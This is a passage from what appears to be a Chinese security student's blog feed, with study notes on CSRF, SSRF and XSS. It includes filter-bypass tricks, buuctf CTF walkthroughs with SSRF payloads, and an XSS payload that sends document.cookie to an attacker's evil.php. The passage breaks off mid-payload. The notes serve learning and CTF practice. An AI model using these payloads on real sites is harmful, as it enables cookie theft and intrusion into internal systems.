6bf9c160683b357f0b8875a2546fe398fc54298dce2f8279a580f211aa3506384f6f39ca91e154ddf33fbb911702e374fa3729b9f217c5666819a43d29b583eba11a4b181c5fb5c8015992c22604093109a08027144ba220eaf85b6ba620d958ad0a710be666318631949233d3b392ba6ca9f15dadc2d63a0544804ebfc8ffa7bde4c9705acb93bbe43d7f6a7c829a0ab245e1519e468e9aa2f6f05c61efd4a7a8661a633b973de63450a23b430c13b28a7db4c24f2051088c6989f41c3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">笔者自己看的 (h1nt：牢大，我想你了(╥﹏╥))</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csrf漏洞学习</title>
    <link href="/2022/08/01/csrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/01/csrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>啊猜猜👴这几天干啥去了</p><span id="more"></span><h1 id="与话题无关的一个吐槽"><a href="#与话题无关的一个吐槽" class="headerlink" title="与话题无关的一个吐槽"></a>与话题无关的一个吐槽</h1><p>吐槽一下<strong>效率极其拉跨</strong>的联想售后😓，以及1次 <strong>愉快</strong> 的售后体验</p><p>电脑出了点<strong>小问题</strong>，网上搜了下这种<strong>小问题</strong>大概80–100r，于是👴出去找联想售后，然后人家检查了一遍告诉👴，我们作为技术人员其实p也不会只会换主板，所以不管啥问题，你只需要掏<strong>区区380r</strong>换个主板就阔以修好了啦，而且如果不你不打算掏这冤枉钱而是想花80r去电器店修，那么你的联想保修就失效辣！我们可没有强迫你哦<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E9%9C%87%E6%83%8A.gif"></p><p>我无可奈何，然后他告诉我主板到货大概要几天，留了我手机号就让我回去等了。由于没钱，所以没法出去玩，于是在宿舍摆了几天大烂😓。可气的是，售后说大概3天就到货了，结果拖来拖去硬是让👴等了6天🤬wnm….<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E4%B8%AD%E6%8C%87.jpg"></p><p>第六天👴彻底不想等了，开始收拾行李离校，顺便去店里准备强行拿电脑+来个撕逼大战。当👴打开手机录音以便保存犯罪证据，走进店里正准备发作，售后小哥信誓旦旦告诉我下午就能到，👴最后信他一次，坐在店里等<br>然后等的过程中👴打开电脑奇迹的发现，这玩意它自己好了???!! 于是趁售后不在带电脑去楼下电器维修检查，人家瞅了瞅告诉我电脑接口没问题，可能只是进水，干了就好了….<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/wtm.png"><br>然后这时候👴想了下: 那既然好了还花钱修什么电脑，这辣鸡服务让👴8爽地等了这么久，👴现在想一走了之了</p><p>但是👴又想发作一下，于是没直接跑路，而是选择回店里当面通知售后，于是发生了以下对话</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">我: 既然电脑检查的没问题，那这电脑👴8修了</span><br><span class="hljs-section">售后: 8行啊兄弟，这货都已经寄来了，突然说不换，主板我咋处理</span><br><span class="hljs-section">我: 哦，主板咋处理是吧，要不拿它捅你的ass♂吧，6天才到货还好意思问我咋办</span><br><br>然后就是售后破防，没准会触发肢体冲突事件，但他拿👴估计是无可奈何的，事后👴满意地潇洒离去...<br></code></pre></td></tr></table></figure><p><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E6%89%BE%E6%89%93.gif"><br>啊当然上述情况都没有发生，我本打算这么说发作一波的，但实际上发生的是这样的</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">我: 既然电脑检查的没问题，那这电脑👴8修了</span><br><span class="hljs-section">售后(若有所思): 哦，这样啊，那我把主板退回去吧，你可以走了</span><br><span class="hljs-section">我(懵逼): 啊????</span><br><br>然后找不到茬、等了1下午的我就这么拖行李走了....<br></code></pre></td></tr></table></figure><p>事后回想，莫名其妙干等6天啥也没干的我突然有种小丑的感觉<br><img src="/images/%E8%A1%A8%E6%83%85%E5%8C%85/%E5%B0%8F%E4%B8%91.jpg"></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>啊那么p话少说，总之👴宝贵的假期时间就这么晃过去了，现在开始要重新更新啦<br>参考链接: <a href="https://www.jianshu.com/p/7f33f9c7997b">浅谈csrf</a></p><p>csrf，跨站请求伪造，利用社会成功学诱导用户点击构造的恶意链接，在用户8知情的情况下让用户对网站完成某些操作</p><p>比如csrf的工具CSRFTester，其原理就是访问1个页面，然后抓捕其html页面，然后自己修改它构造钓鱼界面，诱导用户点击<br>满足csrf，被钓鱼用户需要满足以下条件:<br>登录受信任网站A，并在本地生成Cookie<br>在不登出A的情况下，访问危险网站B</p><h1 id="csrf防御"><a href="#csrf防御" class="headerlink" title="csrf防御"></a>csrf防御</h1><h2 id="referer头"><a href="#referer头" class="headerlink" title="referer头"></a>referer头</h2><p>验证请求是否是用户自愿发起，可以通过检查referer头来判断，如果referer头是来自自己的网站，则可以信任，否则则可能是黑客的钓鱼网站<br>8过这个referer难道无法被篡改吗? 查了1下其实是可以的: “Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障”</p><p>于是对于一些浏览器，就有方法可以篡改cookie，比如IE(拒绝IE，从我做起)</p><h2 id="添加token"><a href="#添加token" class="headerlink" title="添加token"></a>添加token</h2><p>抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，且该信息不存于 cookie 之中<br>可以在 HTTP 请求中以参数的形式(get&#x2F;post)加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，token 可以在用户登陆后产生并放于 session 之中</p><p>这样的缺点是1个网站里可接受请求的地方非常多，对每个请求都加token很麻烦且容易漏掉<br>还有1个问题是token可能被获取: </p><h2 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h2><p>这种方法也是使用 token 并进行验证，不同的是，这里并不是把 token 以参数的形式置于HTTP请求中，而是放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中<br>总之就是没啥缺点，但是十分麻烦</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>总结，感觉就像是盲猜一样，1个1个试<br>1.Refere为空条件下</p><h2 id="空token"><a href="#空token" class="headerlink" title="空token"></a>空token</h2><p>删除token参数或发送空token<br>不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">合法: <br>POST /change_password<br>POST body:<br><span class="hljs-attribute">new_password</span>=qwerty &amp;<span class="hljs-attribute">csrf_tok</span>=871caef0757a4ac9691aceb9aad8b65b<br>伪造: <br>POST /change_password<br>POST body:<br><span class="hljs-attribute">new_password</span>=qwerty<br>或: <br>POST /change_password<br>POST body:<br><span class="hljs-attribute">new_password</span>=qwerty&amp;csrf_tok=<br></code></pre></td></tr></table></figure><h2 id="用其他session"><a href="#用其他session" class="headerlink" title="用其他session"></a>用其他session</h2><p>应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。这种情况，那么你可以试试把自己的token贴在payload里</p><h2 id="移除referer"><a href="#移除referer" class="headerlink" title="移除referer"></a>移除referer</h2><p>可以试试往页面添加以下代码移除referer</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span> =<span class="hljs-string">“referrer”content</span> =<span class="hljs-string">“no-referrer”</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="正则表达绕过域名"><a href="#正则表达绕过域名" class="headerlink" title="正则表达绕过域名"></a>正则表达绕过域名</h2><p>也许referer检查是基于白名单的，那么就阔以正则表达式绕过，想办法在你的钓鱼网站域名里加白名单<br>在后面加域名 qq.com &#x3D;&gt; qq.com.abc.com<br>将域名拼接 abc.qq.com &#x3D;&gt; abc_qq.com<br>在前面或者在后面加字符 qq.com &#x3D;&gt; abcqq.com &#x2F; qq.com &#x3D;&gt; qq.comabc.com &#x2F; qq.com &#x3D;&gt; abc.com&#x2F;qq.com</p><h2 id="配合xss使用"><a href="#配合xss使用" class="headerlink" title="配合xss使用"></a>配合xss使用</h2><p>参考: <a href="https://blog.csdn.net/weixin_50464560/article/details/120581841">链接</a></p><p>更多还在学，靶场还在搭，有优先级更高的事要做，先挖个坑…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf漏洞姿势</title>
    <link href="/2022/07/13/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/07/13/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p><span id="more"></span><p>参考链接: <a href="https://xz.aliyun.com/t/2115">link</a></p><h1 id="扫盲"><a href="#扫盲" class="headerlink" title="扫盲?"></a>扫盲?</h1><h2 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h2><p>需要上传网址的地方，比如: 社交分享功能：获取超链接的标题等内容进行显示; 在线翻译：给网址翻译对应网页的内容</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">查看源代码是否在本地进行了资源请求，比如: <br><span class="hljs-symbol">https:</span><span class="hljs-comment">//www.xxx.com/a.php?image=(地址)</span><br>就可能存在SSRF漏洞<br></code></pre></td></tr></table></figure><p>dnslog等工具测试<br>等待继续总结……</p><h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p>下面实战部分有解释</p><h2 id="ip地址转换绕过"><a href="#ip地址转换绕过" class="headerlink" title="ip地址转换绕过"></a>ip地址转换绕过</h2><p>有些防护会对内网ip地址做正则匹配，如: 127.0.0.1\192.168.0.1这些，这时候可以把这些ip数字改成其他形式，如:<br>192.168.0.1<br>(1)8进制格式：0300.0250.0.1<br>(2)16进制格式：0xC0.0xA8.0.1<br>(3)10进制整数格式：3232235521<br>(4)16进制整数格式：0xC0A80001<br>127.0.0.1<br>8进制: 0177.0.0.1<br>16进制: 0x7F.0.0.1<br>10进制整数格式:<br>16进制整数格式:</p><h2 id="短网址绕过"><a href="#短网址绕过" class="headerlink" title="短网址绕过"></a>短网址绕过</h2><p>什么是短网址捏？自行百度，网上有网址转化短网址的在线工具<br>如(<a href="http://www.baidu.com)与(https//dwz.lc/2fGYWaE)%E4%B8%80%E6%A0%B7">www.baidu.com)与(https://dwz.lc/2fGYWaE)一样</a></p><h2 id="利用问号绕过限制"><a href="#利用问号绕过限制" class="headerlink" title="利用问号绕过限制"></a>利用问号绕过限制</h2><p>比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com">http://www.aaa.com/acb?Url=http://login.aaa.com</a> 这是一个跳转链接，跳转到它的二级域名下，那么如何进行二级域名的绕过呢？<br>其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：<a href="http://www.aaa.com/acb?Url=http://test.com?login.aaa.com">http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</a> 那么，它其实是会跳转到这个test.com域名的，而这个域名自然就是你想跳转的域名辽。跳转后，问号和问号后面的内容会变为这样：<a href="http://www.test.com/?login.aaa.com">http://www.test.com/?login.aaa.com</a></p><h2 id="ip的特殊省略"><a href="#ip的特殊省略" class="headerlink" title="ip的特殊省略"></a>ip的特殊省略</h2><p>eg: 127.0.0.1–&gt;127.1</p><h2 id="ip黑名单过滤的绕过"><a href="#ip黑名单过滤的绕过" class="headerlink" title="ip黑名单过滤的绕过"></a>ip黑名单过滤的绕过</h2><p>见下面实战</p><h1 id="简单实战"><a href="#简单实战" class="headerlink" title="简单实战"></a>简单实战</h1><h2 id="buuctf-第二章-web进阶-SSRF-Training"><a href="#buuctf-第二章-web进阶-SSRF-Training" class="headerlink" title="buuctf[第二章 web进阶]SSRF Training"></a>buuctf[第二章 web进阶]SSRF Training</h2><p>进入页面，查看php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123; <span class="hljs-comment">//检查是否是内网</span><br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>); <span class="hljs-comment">// http/https ://</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>    &#125; <br>    <span class="hljs-keyword">try</span>&#123; <br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>); <span class="hljs-comment">//搜索到了parse_url的解析和绕过</span><br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];  <span class="hljs-comment">//host: 域名</span><br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);  <span class="hljs-comment">//通过域名获取ip地址</span><br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//将 IPV4 的字符串互联网协议转换成长整型数字</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>; <span class="hljs-comment">//$int_ip==127.0.0.0||10.0.0.0||172.16.0.0||192.168.0.0</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_inner_ip</span>(<span class="hljs-variable">$url</span>)) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>; <br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">//curl_init(): 初始化1个url会话(顾名思义)</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <span class="hljs-comment">//设置url</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">//将其设置为1，可以获取返回值</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);  <span class="hljs-comment">//你tm翻译这些干啥？ </span><br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//执行</span><br>        <span class="hljs-variable">$result_info</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]) &#123; <br>            <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$output</span>); <br>    &#125;<br>     <span class="hljs-comment">//return值呢？</span><br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$url</span>))&#123; <br>    <span class="hljs-title function_ invoke__">safe_request_url</span>(<span class="hljs-variable">$url</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>url构成参考这个<a href="https://blog.csdn.net/qq_39458856/article/details/81809738?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-81809738-blog-111668038.pc_relevant_multi_platform_whitelistv2&spm=1001.2101.3001.4242.1&utm_relevant_index=3">链接</a></p><p>那么举个例子，parse_url()会把1个url字符串解析成下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-string">&quot;http://a:@127.0.0.1:80@baidu.com/flag.php&quot;</span>;<br><span class="hljs-variable">$parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$parse</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*输出: </span><br><span class="hljs-comment">array(5) &#123;</span><br><span class="hljs-comment">  [&quot;scheme&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;http&quot;</span><br><span class="hljs-comment">  [&quot;host&quot;]=&gt;</span><br><span class="hljs-comment">  string(9) &quot;baidu.com&quot;</span><br><span class="hljs-comment">  [&quot;user&quot;]=&gt;</span><br><span class="hljs-comment">  string(1) &quot;a&quot;</span><br><span class="hljs-comment">  [&quot;pass&quot;]=&gt;</span><br><span class="hljs-comment">  string(13) &quot;@127.0.0.1:80&quot;</span><br><span class="hljs-comment">  [&quot;path&quot;]=&gt;</span><br><span class="hljs-comment">  string(9) &quot;/flag.php&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>这个题的关键，在于parse_url(和curl_setopt()的解析url方式的8同: curl会匹配第一个@后的，而parse_url则匹配第二个@后的<br><img src="/images/%E5%88%B7%E9%A2%98/buuctf(4).png"><br>构造payload: </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">url=http:<span class="hljs-regexp">//a</span>:@127.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">80</span>@baidu.com/flag.php<br></code></pre></td></tr></table></figure><p>被parse_url()解析为: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">5</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;baidu.com&quot;</span><br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;@127.0.0.1:80&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;/flag.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是curl则会匹配第一个@后的内容，于是就绕过辽</p><h2 id="buuctf-第三章-web进阶-Python里的SSRF"><a href="#buuctf-第三章-web进阶-Python里的SSRF" class="headerlink" title="buuctf[第三章 web进阶]Python里的SSRF"></a>buuctf[第三章 web进阶]Python里的SSRF</h2><p>进入页面，扫了一圈发现p线索都没有…..啊不是，最后看了看提示: url parameter is required 翻译: 需要参数url<br>所以说学好英语是多么重要，不要老是依赖机翻…</p><p>要求是尝试访问到容器内部的 8000 端口和 url path &#x2F;api&#x2F;internal&#x2F;secret 即可获取 flag</p><p>127.0.0.1被限制，尝试绕过:<br>@失败，数制转换失败，localhost也8行，👴8行了</p><p>看了看wp，有以下几种方法</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.2:8000</span>/api/internal/secret   //原理: <span class="hljs-number">127.0.0.1</span>和<span class="hljs-number">127.0.0.2</span>都是内网ip本地的默认地址，<span class="hljs-number">127.0.0.2</span>如果不是特别设置应该<span class="hljs-number">8</span>会存在...所以...<br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>:<span class="hljs-number">8000</span>/api/internal/secret      //用<span class="hljs-number">0</span>代替了<span class="hljs-number">127.0.0.1</span>，我也<span class="hljs-number">8</span>知道为什么<br><span class="hljs-attribute">http</span>://<span class="hljs-number">0.0.0.0:8000</span>/api/internal/secret   //<span class="hljs-number">127.0.0.1</span>是本机的环回地址，<span class="hljs-number">0.0.0.0</span>代表本机上任何IP地址，因此可以利用<span class="hljs-number">0.0.0.0</span>来绕过<span class="hljs-number">127.0.0.1</span>的过滤。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss漏洞学习</title>
    <link href="/2022/07/07/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/07/07/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>学习笔记、思路整理(损版)</p><span id="more"></span><p>用来偷别人cookie的，这样就可以用这个cookie做坏事辽(比如登录qq空间)</p><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p><a href="http://xsst.sinaapp.com/example/1-1.php">参考教程</a></p><p>首先，还是闭合<br>其次，是检查有无没有被ban的函数<br>eg: </p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xquery">page=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>   //没啥用，就是弹个窗<br>page=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">location.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://你自己的网站/evil.php?cookie=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>/*<br>解释: location.href=<span class="hljs-string">&quot;恶意地址&quot;</span>; //这句话可以让当前页面(location)的地址(href)，跳转到恶意地址<span class="hljs-built_in"></span><br><span class="hljs-built_in">document</span>.cookie //就是当前页面的cookies数据<br>encodeURIComponent<span class="hljs-built_in">(document</span>.cookie) //就是将cookies数据编码一下(防止cookies中有特殊的符号，导致地址错误)<br>location.href=<span class="hljs-string">&quot;恶意地址&quot;</span>+encodeURIComponent<span class="hljs-built_in">(document</span>.cookie) //就是将编码后的数据加在恶意地址之后<br>*/<br>然后是闭合，比如已知js代码: var page= <span class="hljs-string">&quot;1&quot;</span>;    //此处的<span class="hljs-number">1</span>是传入的参数page，可替换、闭合<br>http://xsst.sinapp.com/example/<span class="hljs-number">1</span>-<span class="hljs-number">2</span>.php?page=<span 